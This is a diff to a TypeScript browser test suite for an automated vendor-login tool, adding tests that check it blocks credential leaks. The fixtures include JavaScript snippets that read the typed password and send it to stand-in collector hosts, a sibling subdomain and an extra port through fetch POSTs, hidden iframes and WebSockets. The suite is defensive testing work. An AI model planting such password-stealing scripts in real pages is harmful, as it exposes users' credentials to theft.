@@ -28,7 +28,7 @@ const WRONG_PASSWORD = "fixture-wrong-password-SENTINEL";
 
 type Served = { status?: number; contentType?: string; body: string };
 type Site = Record<string, Served | ((request: Request) => Served)>;
-type Observed = { requests: string[]; posts: Array<{ target: string; body: string }> };
+type Observed = { requests: string[]; posts: Array<{ target: string; body: string }>; sockets: string[] };
 
 const html = (body: string): Served => ({ body });
 const json = (status: number, body: unknown): Served => ({ status, contentType: "application/json", body: JSON.stringify(body) });
@@ -114,6 +114,9 @@ function quickpartsSite(app: string, onSuccess?: unknown): Site {
     "POST quickquote.quickparts.com/api/login": loginResponder(onSuccess),
     "POST quickquote.quickparts.com/api/register": json(200, {}),
     "POST collector.offhost-fixture.test/c": json(200, {}),
+    // A sibling subdomain and another port on a reviewed host: neither is a reviewed origin.
+    "POST unreviewed.quickparts.com/c": json(200, {}),
+    "POST quickquote.quickparts.com:8443/c": json(200, {}),
     "GET collector.offhost-fixture.test/c": html(""),
   };
 }
@@ -262,6 +265,13 @@ async function serve(context: BrowserContext, site: Site, observed: Observed) {
     const response = typeof entry === "function" ? entry(request) : entry;
     await route.fulfill({ status: response.status ?? 200, contentType: response.contentType ?? "text/html", body: response.body });
   });
+  // A stand-in socket server for every host: it records each connection and message it receives.
+  await context.routeWebSocket("**/*", (socket) => {
+    observed.sockets.push(`open ${socket.url()}`);
+    socket.onMessage((message) => {
+      observed.sockets.push(`message ${socket.url()} ${String(message)}`);
+    });
+  });
 }
 
 const authenticatedEvidence = (vendor: UnattendedLoginVendor): SessionProbeEvidence => ({
@@ -271,7 +281,7 @@ const authenticatedEvidence = (vendor: UnattendedLoginVendor): SessionProbeEvide
 
 async function runLogin(vendor: UnattendedLoginVendor, site: Site, password = PASSWORD) {
   stateDir = await fs.realpath(await fs.mkdtemp(path.join(os.tmpdir(), "ovd-vendor-login-browser-")));
-  const observed: Observed = { requests: [], posts: [] };
+  const observed: Observed = { requests: [], posts: [], sockets: [] };
   const lines: string[] = [];
   const deps: VendorLoginDeps = {
     config: {
@@ -395,6 +405,53 @@ describe("login:vendors against synthetic portals", () => {
     const { result, observed } = await runLogin("quickparts", quickpartsSite(quickpartsApp({ onSubmit: exfiltrate })));
     expect(result).toMatchObject({ outcome: "saved" });
     expect(observed.requests.some((request) => request.includes("offhost-fixture.test"))).toBe(false);
+  }, PRODUCTION_PORTAL_BROWSER_TIMEOUT_MS);
+
+  it("aborts posts of the password to a sibling subdomain or another port of a reviewed host", async () => {
+    const exfiltrate = `const typed = new FormData(login).get("password");
+      for (const target of ["https://unreviewed.quickparts.com/c", "https://quickquote.quickparts.com:8443/c"]) {
+        fetch(target, { method: "POST", body: typed }).catch(() => {});
+      }
+      await new Promise((resolve) => setTimeout(resolve, 300));`;
+    const { result, observed } = await runLogin("quickparts", quickpartsSite(quickpartsApp({ onSubmit: exfiltrate })));
+    expect(result).toMatchObject({ outcome: "saved" });
+    expect(observed.posts.map((post) => post.target)).toEqual(["quickquote.quickparts.com/api/login"]);
+    expect(observed.requests.some((request) => request.includes("unreviewed.quickparts.com") || request.includes(":8443"))).toBe(false);
+  }, PRODUCTION_PORTAL_BROWSER_TIMEOUT_MS);
+
+  it("stops before typing into a form that submits to a sibling subdomain of a reviewed host", async () => {
+    const form = `'<form id="login" method="post" action="https://unreviewed.quickparts.com/c">'
+      + '<input type="email" name="email" autocomplete="username"><input type="password" name="password" autocomplete="current-password">'
+      + '<button type="submit">Sign in</button></form>'`;
+    const { result, observed } = await runLogin("quickparts", quickpartsSite(quickpartsApp({ form })));
+    expect(result).toMatchObject({ outcome: "stopped", reason: "unknown_page:form_submits_off_host", host: "unreviewed.quickparts.com" });
+    expect(observed.posts).toEqual([]);
+  }, PRODUCTION_PORTAL_BROWSER_TIMEOUT_MS);
+
+  it("aborts a child frame's script that posts the password to another host", async () => {
+    // A same-origin frame reads the parent's field and posts from its own context, neither a main-frame request nor a navigation.
+    const exfiltrate = `const sink = document.createElement("iframe");
+      sink.srcdoc = "<script>fetch('https://collector.offhost-fixture.test/c', { method: 'POST', body: parent.document.querySelector('[name=password]').value }).catch(() => {});<\\/script>";
+      document.body.appendChild(sink);
+      await new Promise((resolve) => setTimeout(resolve, 500));`;
+    const { result, observed } = await runLogin("quickparts", quickpartsSite(quickpartsApp({ onSubmit: exfiltrate })));
+    expect(result).toMatchObject({ outcome: "saved" });
+    expect(observed.posts.map((post) => post.target)).toEqual(["quickquote.quickparts.com/api/login"]);
+    expect(observed.requests.some((request) => request.includes("offhost-fixture.test"))).toBe(false);
+  }, PRODUCTION_PORTAL_BROWSER_TIMEOUT_MS);
+
+  it("refuses WebSockets to unreviewed origins from the page and from a child frame", async () => {
+    const exfiltrate = `const typed = new FormData(login).get("password");
+      const send = (url) => { try { const socket = new WebSocket(url); socket.onopen = () => socket.send(typed); } catch {} };
+      send("wss://collector.offhost-fixture.test/s");
+      send("wss://unreviewed.quickparts.com/s");
+      const sink = document.createElement("iframe");
+      sink.srcdoc = "<script>const s = new WebSocket('wss://collector.offhost-fixture.test/frame'); s.onopen = () => s.send(parent.document.querySelector('[name=password]').value);<\\/script>";
+      document.body.appendChild(sink);
+      await new Promise((resolve) => setTimeout(resolve, 500));`;
+    const { result, observed } = await runLogin("quickparts", quickpartsSite(quickpartsApp({ onSubmit: exfiltrate })));
+    expect(result.outcome).toBe("saved");
+    expect(observed.sockets).toEqual([]);
   }, PRODUCTION_PORTAL_BROWSER_TIMEOUT_MS);
 
   it("aborts a sign-in form that targets a popup or an iframe on another host", async () => {
